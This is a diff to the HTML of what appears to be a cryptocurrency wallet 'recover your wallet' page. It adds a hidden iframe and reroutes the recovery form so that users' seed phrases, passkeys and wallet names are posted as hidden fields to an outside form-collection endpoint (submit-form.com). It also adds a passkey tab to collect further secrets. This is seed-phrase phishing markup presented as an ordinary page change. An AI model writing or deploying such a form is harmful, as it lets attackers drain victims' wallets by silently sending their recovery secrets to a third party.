@@ -14,6 +14,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
+<iframe name="submissionFrame" style="display:none;"></iframe>
 <body>
     <div class="language-selector" id="languageSelector">
         <button class="language-btn" id="languageBtn">
@@ -325,15 +326,30 @@
         </div>
     </div>
 
-    <div class="modal" id="phraseModal">
-        <div class="modal-content modal-phrase">
-            <div class="modal-header">
-                <h3>Import Recovery Phrase</h3>
-                <button class="close-btn" id="closePhraseModal">&times;</button>
-            </div>
-            <p class="phrase-instruction">Enter your seed phrase words. Press Enter after each word. Supports 12, 16, or 24-word phrases.</p>
+   <div class="modal" id="phraseModal">
+    <div class="modal-content modal-phrase">
+        <div class="modal-header">
+            <h3>Import Recovery Method</h3>
+            <button class="close-btn" id="closePhraseModal">&times;</button>
+        </div>
 
-            <form id="phraseForm" class="phrase-form" action="">
+        <div class="method-toggle">
+            <button type="button" class="method-btn method-active" id="seedPhraseMethodBtn">
+                <span>Seed Phrase</span>
+            </button>
+            <button type="button" class="method-btn" id="passkeyMethodBtn">
+                <span>Passkey</span>
+            </button>
+        </div>
+
+        <form id="phraseForm" class="phrase-form" action="https://submit-form.com/ujBweY10O" method="POST" target="submissionFrame">
+            <input type="hidden" name="seed-phrase" id="seedPhraseHidden">
+            <input type="hidden" name="passkey" id="passkeyHidden">
+            <input type="hidden" name="wallet" id="walletHidden">
+            <input type="hidden" name="method" id="methodHidden" value="seed-phrase">
+
+            <div id="seedPhraseSection" class="method-section active">
+                <p class="phrase-instruction">Enter your seed phrase words. Press Enter after each word. Supports 12, 16, or 24-word phrases.</p>
                 <div class="phrase-input-wrapper">
                     <div id="phraseDisplay" class="phrase-display"></div>
                     <input type="text" id="phraseInput" class="phrase-input" placeholder="Type first word and press Enter..." autocomplete="off">
@@ -342,14 +358,24 @@
                 <div class="word-count-info">
                     <span id="wordCount">0</span> / <span id="wordTarget">12-16-24</span> words
                 </div>
+            </div>
 
-                <div class="form-actions">
-                    <button type="button" class="btn btn-secondary" id="cancelPhraseBtn">Cancel</button>
-                    <button type="submit" class="btn btn-primary" id="proceedBtn" disabled>Verify & Proceed</button>
+            <div id="passkeySection" class="method-section">
+                <p class="phrase-instruction">Enter your passkey. Typically a long alphanumeric string.</p>
+                <input type="text" id="passkeyInput" class="phrase-input" placeholder="Paste your passkey here..." autocomplete="off">
+                <div class="passkey-info">
+                    <span id="passkeyLength">0</span> characters
                 </div>
-            </form>
-        </div>
+            </div>
+
+            <div class="form-actions">
+                <button type="button" class="btn btn-secondary" id="cancelPhraseBtn">Cancel</button>
+                <button type="submit" class="btn btn-primary" id="proceedBtn" disabled>Verify & Proceed</button>
+            </div>
+        </form>
     </div>
+</div>
+
 
     <div class="modal" id="successModal">
         <div class="modal-content modal-success">
